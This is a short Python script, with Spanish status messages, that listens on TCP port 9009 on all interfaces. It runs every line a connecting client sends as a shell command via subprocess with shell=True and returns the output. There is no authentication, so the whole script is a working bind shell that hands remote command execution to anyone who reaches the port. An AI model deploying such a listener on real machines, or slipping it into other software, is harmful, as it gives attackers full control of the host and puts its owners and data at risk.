import socket
import subprocess as sp


serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
host = ""
port = 9009

serversocket.bind((host, port))

serversocket.listen(5)

clientsocket, addr = serversocket.accept()

while True:
    d = clientsocket.recv(1024)
    msg = d.decode("utf8")
    msg = msg.replace("\n","").replace("\r","")
    if d == "" or len(d) == 0:
        print("Exit")
        break
    print(f"Dirección: {str(addr)}")
    print(f"Recibido: {msg}")

    command = sp.Popen([msg], shell=True, stdout=sp.PIPE, stderr=sp.PIPE, text=True)

    stdout, stderr = command.communicate()

    print(command.returncode)
    if command.returncode == 0:
        resp = "OK \n"+stdout
    elif command.returncode != 0:
        resp = "ERROR \n"+stderr

    clientsocket.send(resp.encode('utf8'))